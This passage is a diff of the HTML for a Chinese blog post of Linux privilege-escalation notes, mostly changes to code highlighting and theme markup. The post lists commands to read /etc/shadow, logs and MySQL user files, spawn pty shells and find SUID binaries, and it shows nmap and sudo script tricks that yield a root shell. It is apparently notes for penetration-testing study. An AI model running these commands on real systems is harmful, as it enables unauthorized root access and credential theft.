/etc/httpd/logs/error_log</span><br><span class="line">cat /etc/httpd/logs/error.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/apache2/access_log</span><br><span class="line">cat /var/<span class="built_in">log</span>/apache2/access.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/apache2/error_log</span><br><span class="line">cat /var/<span class="built_in">log</span>/apache2/error.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/apache/access_log</span><br><span class="line">cat /var/<span class="built_in">log</span>/apache/access.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/auth.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/chttp.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/cups/error_log</span><br><span class="line">cat /var/<span class="built_in">log</span>/dpkg.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/faillog</span><br><span class="line">cat /var/<span class="built_in">log</span>/httpd/access_log</span><br><span class="line">cat /var/<span class="built_in">log</span>/httpd/access.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/httpd/error_log</span><br><span class="line">cat /var/<span class="built_in">log</span>/httpd/error.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/lastlog</span><br><span class="line">cat /var/<span class="built_in">log</span>/lighttpd/access.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/lighttpd/error.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/lighttpd/lighttpd.access.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/lighttpd/lighttpd.error.log</span><br><span class="line">cat /var/<span class="built_in">log</span>/messages</span><br><span class="line">cat /var/<span class="built_in">log</span>/secure</span><br><span class="line">cat /var/<span class="built_in">log</span>/syslog</span><br><span class="line">cat /var/<span class="built_in">log</span>/wtmp</span><br><span class="line">cat /var/<span class="built_in">log</span>/xferlog</span><br><span class="line">cat /var/<span class="built_in">log</span>/yum.log</span><br><span class="line">cat /var/run/utmp</span><br><span class="line">cat /var/webmin/miniserv.log</span><br><span class="line">cat /var/www/logs/access_log</span><br><span class="line">cat /var/www/logs/access.log</span><br><span class="line">ls -alh /var/lib/dhcp3/</span><br><span class="line">ls -alh /var/<span class="built_in">log</span>/postgresql/</span><br><span class="line">ls -alh /var/<span class="built_in">log</span>/proftpd/</span><br><span class="line">ls -alh /var/<span class="built_in">log</span>/samba/</span><br><span class="line"></span><br><span class="line">Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/boot.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/cron</span><br><span class="line"><span class="built_in">cat</span> /var/log/syslog</span><br><span class="line"><span class="built_in">cat</span> /var/log/wtmp</span><br><span class="line"><span class="built_in">cat</span> /var/run/utmp</span><br><span class="line"><span class="built_in">cat</span> /etc/httpd/logs/access_log</span><br><span class="line"><span class="built_in">cat</span> /etc/httpd/logs/access.log</span><br><span class="line"><span class="built_in">cat</span> /etc/httpd/logs/error_log</span><br><span class="line"><span class="built_in">cat</span> /etc/httpd/logs/error.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/access_log</span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/access.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/error_log</span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/error.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/apache/access_log</span><br><span class="line"><span class="built_in">cat</span> /var/log/apache/access.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/auth.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/chttp.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/cups/error_log</span><br><span class="line"><span class="built_in">cat</span> /var/log/dpkg.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/faillog</span><br><span class="line"><span class="built_in">cat</span> /var/log/httpd/access_log</span><br><span class="line"><span class="built_in">cat</span> /var/log/httpd/access.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/httpd/error_log</span><br><span class="line"><span class="built_in">cat</span> /var/log/httpd/error.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/lastlog</span><br><span class="line"><span class="built_in">cat</span> /var/log/lighttpd/access.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/lighttpd/error.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/lighttpd/lighttpd.access.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/lighttpd/lighttpd.error.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/messages</span><br><span class="line"><span class="built_in">cat</span> /var/log/secure</span><br><span class="line"><span class="built_in">cat</span> /var/log/syslog</span><br><span class="line"><span class="built_in">cat</span> /var/log/wtmp</span><br><span class="line"><span class="built_in">cat</span> /var/log/xferlog</span><br><span class="line"><span class="built_in">cat</span> /var/log/yum.log</span><br><span class="line"><span class="built_in">cat</span> /var/run/utmp</span><br><span class="line"><span class="built_in">cat</span> /var/webmin/miniserv.log</span><br><span class="line"><span class="built_in">cat</span> /var/www/logs/access_log</span><br><span class="line"><span class="built_in">cat</span> /var/www/logs/access.log</span><br><span class="line"><span class="built_in">ls</span> -alh /var/lib/dhcp3/</span><br><span class="line"><span class="built_in">ls</span> -alh /var/log/postgresql/</span><br><span class="line"><span class="built_in">ls</span> -alh /var/log/proftpd/</span><br><span class="line"><span class="built_in">ls</span> -alh /var/log/samba/</span><br><span class="line"></span><br><span class="line">Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp</span><br></pre></td></tr></table></figure>
 <h2 id="敏感文件">敏感文件</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/group</span><br><span class="line">cat /etc/shadow</span><br><span class="line">ls -alh /var/mail/</span><br><span class="line">ls -ahlR /root/</span><br><span class="line">ls -ahlR /home/</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"><span class="built_in">cat</span> /etc/group</span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br><span class="line"><span class="built_in">ls</span> -alh /var/mail/</span><br><span class="line"><span class="built_in">ls</span> -ahlR /root/</span><br><span class="line"><span class="built_in">ls</span> -ahlR /home/</span><br></pre></td></tr></table></figure>
 <h2 id="特殊的数据库配置文件">特殊的数据库、配置文件</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /var/apache2/config.inc</span><br><span class="line">cat /var/lib/mysql/mysql/user.MYD</span><br><span class="line">cat /root/anaconda-ks.cfg</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/apache2/config.inc</span><br><span class="line"><span class="built_in">cat</span> /var/lib/mysql/mysql/user.MYD</span><br><span class="line"><span class="built_in">cat</span> /root/anaconda-ks.cfg</span><br></pre></td></tr></table></figure>
 <h2 id="交互式shell">交互式shell</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line">/bin/sh -i</span><br></pre></td></tr></table></figure>
 <h2 id="查看安装过的工具">查看安装过的工具</h2>
@@ -280,9 +326,9 @@ NIC？它是否连接到另一个网络？</span></a></li><li class="nav-item na
 <h2 id="通讯与网络">通讯与网络</h2>
 <h4 id="系统有哪些-nic它是否连接到另一个网络">系统有哪些
 NIC？<em>它是否连接到另一个网络？</em></h4>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network </span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/ifconfig -a <span class="built_in">cat</span> /etc/network/interfaces <span class="built_in">cat</span> /etc/sysconfig/network </span><br></pre></td></tr></table></figure>
 <h4 id="网络配置设置是什么你能从这个网络中找到什么dhcp服务器域名服务器网关">网络配置设置是什么？<em>你能从这个网络中找到什么？DHCP服务器？域名服务器？网关？</em></h4>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname </span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/resolv.conf <span class="built_in">cat</span> /etc/sysconfig/network <span class="built_in">cat</span> /etc/networks iptables -L hostname dnsdomainname </span><br></pre></td></tr></table></figure>
 <h4 id="还有哪些其他用户和主机正在与系统通信">还有哪些其他用户和主机正在与系统通信？</h4>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w </span><br></pre></td></tr></table></figure>
 <h4 id="缓存了什么ip-和或-mac-地址">缓存了什么？<em>IP 和/或 MAC
@@ -294,7 +340,7 @@ NIC？<em>它是否连接到另一个网络？</em></h4>
 <blockquote>
 <p>参考资料https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -1000 -<span class="built_in">type</span> d 2&gt;/dev/null   <span class="comment"># Sticky bit</span></span><br><span class="line">find / -perm -g=s -<span class="built_in">type</span> f 2&gt;/dev/null    <span class="comment"># SGID (chmod 2000)</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null    <span class="comment"># SUID (chmod 4000)</span></span><br><span class="line"></span><br><span class="line">find / -perm -g=s -o -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null    <span class="comment"># SGID or SUID</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `locate -r <span class="string">&quot;bin$&quot;</span>`; <span class="keyword">do</span> find <span class="variable">$i</span> \( -perm -4000 -o -perm -2000 \) -<span class="built_in">type</span> f 2&gt;/dev/null; <span class="keyword">done</span>    <span class="comment"># 查找 /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者是 *bin 是否存在 SGID or SUID （快速搜查方式）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 root (/) 开始查找是否存在 SGID or SUID, not Symbolic links, 文件夹深度为 3(可以更改), 并列出错误信息 (例如 permission denied)</span></span><br><span class="line">find / -perm -g=s -o -perm -4000 ! -<span class="built_in">type</span> l -maxdepth 3 -<span class="built_in">exec</span> ls -ld &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -1000 -<span class="built_in">type</span> d 2&gt;/dev/null   <span class="comment"># Sticky bit</span></span><br><span class="line">find / -perm -g=s -<span class="built_in">type</span> f 2&gt;/dev/null    <span class="comment"># SGID (chmod 2000)</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null    <span class="comment"># SUID (chmod 4000)</span></span><br><span class="line"></span><br><span class="line">find / -perm -g=s -o -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null    <span class="comment"># SGID or SUID</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `locate -r <span class="string">&quot;bin$&quot;</span>`; <span class="keyword">do</span> find <span class="variable">$i</span> \( -perm -4000 -o -perm -2000 \) -<span class="built_in">type</span> f 2&gt;/dev/null; <span class="keyword">done</span>    <span class="comment"># 查找 /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者是 *bin 是否存在 SGID or SUID （快速搜查方式）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 root (/) 开始查找是否存在 SGID or SUID, not Symbolic links, 文件夹深度为 3(可以更改), 并列出错误信息 (例如 permission denied)</span></span><br><span class="line">find / -perm -g=s -o -perm -4000 ! -<span class="built_in">type</span> l -maxdepth 3 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ld &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 <h3 id="查看可写执行目录">查看可写/执行目录</h3>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find / -writable -type d 2&gt;/dev/null      # world-writeable folders</span><br><span class="line">find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders</span><br><span class="line">find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders</span><br><span class="line"></span><br><span class="line">find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders</span><br><span class="line"></span><br><span class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</span><br></pre></td></tr></table></figure>
 <h1 id="提权">提权</h1>
@@ -317,7 +363,7 @@ NIC？<em>它是否连接到另一个网络？</em></h4>
 <p><code>nmap --interactive</code> 可以进入交互模式。</p>
 <p>进入交互模式后即可随意使用各种需要 root 权限的命令。</p>
 <p>5.2.0 之后，nmap 还可以通过执行脚本来提权。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> nse 脚本，shell.nse</span></span><br><span class="line">os.execute(&#x27;/bin/sh&#x27;)</span><br><span class="line"><span class="meta">#</span><span class="bash"> nmap 提权</span></span><br><span class="line">nmap --script=shell.nse </span><br><span class="line"><span class="meta">#</span><span class="bash"> 在某些发行版的Linux 可能会提权失败。</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nse 脚本，shell.nse</span></span><br><span class="line">os.execute(&#x27;/bin/sh&#x27;)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nmap 提权</span></span><br><span class="line">nmap --script=shell.nse </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在某些发行版的Linux 可能会提权失败。</span></span><br></pre></td></tr></table></figure>
 <p>或者</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; getshell</span><br><span class="line">sudo nmap --script=getshell</span><br></pre></td></tr></table></figure>
 <h3 id="vim">vim</h3>
@@ -329,7 +375,7 @@ NIC？<em>它是否连接到另一个网络？</em></h4>
 <p>同理，满足条件的 less 和 more 都可。</p>
 <h3 id="date">date</h3>
 <p>它从文件中读取数据，它可用于进行特权读取或在受限文件系统之外公开文件。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LFILE=file_to_read</span><br><span class="line">date -f <span class="variable">$LFILE</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LFILE=file_to_read</span><br><span class="line"><span class="built_in">date</span> -f <span class="variable">$LFILE</span></span><br></pre></td></tr></table></figure>
 <h2 id="利用内核漏洞">利用内核漏洞</h2>
 <p>比如说对于 Ubuntu 16.04 可以直接查找漏洞的 exp 代码。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure>
@@ -396,8 +442,25 @@ root
     
 
     <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>qsdz
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://hasegawaazusa.github.io/linux-privilege-escalation-note.html" title="linux提权笔记">https://hasegawaazusa.github.io/linux-privilege-escalation-note.html</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
           <div class="post-tags">
-              <a href="/tags/note/" rel="tag"># note</a>
+              <a href="/tags/note/" rel="tag"><i class="fa fa-tag"></i> note</a>
           </div>
 
         
@@ -431,12 +494,12 @@ root
 
 
 <div class="copyright">
-  &copy; 
+  &copy; 2022 – 
   <span itemprop="copyrightYear">2023</span>
   <span class="with-love">
-    <i class="fa fa-heart"></i>
+    <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">qsDuzou</span>
+  <span class="author" itemprop="copyrightHolder"></span>
 </div>
 <div class="wordcount">
   <span class="post-meta-item">
@@ -452,23 +515,16 @@ root
     <span title="站点阅读时长">6:40</span>
   </span>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
-  </div>
 
     </div>
   </footer>
 
   
-  <div class="toggle sidebar-toggle" role="button">
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-  </div>
-  <div class="sidebar-dimmer"></div>
   <div class="back-to-top" role="button" aria-label="返回顶部">
     <i class="fa fa-arrow-up fa-lg"></i>
     <span>0%</span>
   </div>
+  <div class="reading-progress-bar"></div>
 
 <noscript>
   <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
@@ -477,7 +533,15 @@ root
 
   
   <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
 
   
 
@@ -486,7 +550,8 @@ root
 
   
 
-
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
 
 
 
